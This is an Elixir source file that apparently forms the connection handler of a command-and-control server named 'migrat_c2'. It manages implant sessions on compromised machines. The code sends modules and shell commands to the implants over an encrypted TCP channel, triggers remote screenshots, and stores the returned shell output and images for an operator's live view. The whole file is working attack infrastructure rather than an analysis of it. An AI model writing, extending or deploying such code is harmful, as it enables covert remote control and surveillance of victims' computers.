defmodule Connections.Handler do
  use GenServer

  require Logger

  alias Connections.Translator
  alias Connections.Registry

  def start(client, ident) do
    Logger.info("in start")

    {:ok, server_pid} =
      DynamicSupervisor.start_child(
        Connections.HandlerSupervisor,
        Connections.Handler.child_spec(%{socket: client, ident: ident})
      )

    {:ok, pid} =
      Task.Supervisor.start_child(Connections.ReadloopSupervisor, fn ->
        read_loop(client, server_pid)
      end)

    :ok = :gen_tcp.controlling_process(client, pid)
    GenServer.cast(server_pid, {:started_readloop, pid})
  end

  def disconnect(process) do
    GenServer.cast(process, :disconnect)
  end

  def send_module_start(process, name, data, args, type) do
    m = Migrat.ModuleStart.new(name: name, data: data, args: args, type: type)
    GenServer.cast(process, {:module_start, m})
  end

  def send_module_input(process, modulename, command) do
    m = Migrat.ModuleInput.new(name: modulename, input: command)

    GenServer.cast(process, {:module_input, m})
  end

  def send_take_screenshot(process) do
    m = Migrat.TakeScreenshot.new()
    GenServer.cast(process, {:take_screenshot, m})
  end

  defp read_loop(client, server) do
    case client |> Translator.read_message(Application.fetch_env!(:migrat_c2, :initkey)) do
      {:ok, message} ->
        GenServer.cast(server, message)
        read_loop(client, server)

      v ->
        Logger.info("error reading message")
        IO.inspect(v)
        Connections.Handler.disconnect(server)
    end
  end

  def start_link(default) do
    GenServer.start_link(__MODULE__, default)
  end

  @impl true
  def init(state) do
    Registry.connection_established(state.ident)
    {:ok, state}
  end

  @impl true
  def handle_cast({:ident, ident}, state) do
    Logger.info("process  got ident #{ident}")
    {:noreply, state}
  end

  @impl true
  def handle_cast({:error, m}, state) do
    Logger.info("process got error from implant: #{m.message}")
    {:noreply, state}
  end

  @impl true
  def handle_cast({:module_start, m}, state) do
    Logger.info("got module start for module #{m.name}")

    Translator.send_message(
      state.socket,
      :module_start,
      m,
      Application.fetch_env!(:migrat_c2, :initkey)
    )
    |> handle_error()

    {:noreply, state}
  end

  @impl true
  def handle_cast({:module_list, m}, state) do
    Logger.info("got module list")
    IO.inspect(m)
    Registry.update_running_modules(state.ident.id, m.modules)
    MigratC2.LiveUpdate.module_list(state.ident.id, m.modules)
    {:noreply, state}
  end

  @impl true
  def handle_cast({:module_input, input}, state) do
    Logger.info("process got module_input for #{input.name} with data #{input.input}")

    Translator.send_message(
      state.socket,
      :module_input,
      input,
      Application.fetch_env!(:migrat_c2, :initkey)
    )
    |> handle_error()

    {:noreply, state}
  end

  def handle_cast({:module_output, response}, state) do
    Logger.info("process  got module output from #{response.name} with data #{response.output}")

    Registry.insert_shell_line(state.ident.id, response.output)
    MigratC2.LiveUpdate.module_output(state.ident.id, response.name, response.output)
    {:noreply, state}
  end

  def handle_cast({:take_screenshot, message}, state) do
    Logger.info("process  got take_screenshot")

    Translator.send_message(
      state.socket,
      :take_screenshot,
      message,
      Application.fetch_env!(:migrat_c2, :initkey)
    )
    |> handle_error()

    {:noreply, state}
  end

  def handle_cast({:screenshot, m}, state) do
    Logger.info("process got screenshot")
    IO.inspect(m)
    base64 = Base.encode64(m.data)
    MigratC2.LiveUpdate.new_screenshot(state.ident.id, base64)
    {:noreply, state}
  end

  def handle_cast(:disconnect, state) do
    Logger.info("process got disconnect command")
    Task.Supervisor.terminate_child(Connections.ReadloopSupervisor, state.readloop_pid)
    :gen_tcp.close(state.socket)
    Registry.connection_closed(state.ident.id)
    DynamicSupervisor.terminate_child(Connections.HandlerSupervisor, self())
    {:noreply, state}
  end

  def handle_cast({:started_readloop, pid}, state) do
    state = Map.put(state, :readloop_pid, pid)
    {:noreply, state}
  end

  def handle_error(val) do
    case IO.inspect(val) do
      {:error, reason} ->
        IO.inspect(reason)
        Connections.Handler.disconnect(self())

      val ->
        val
    end
  end
end
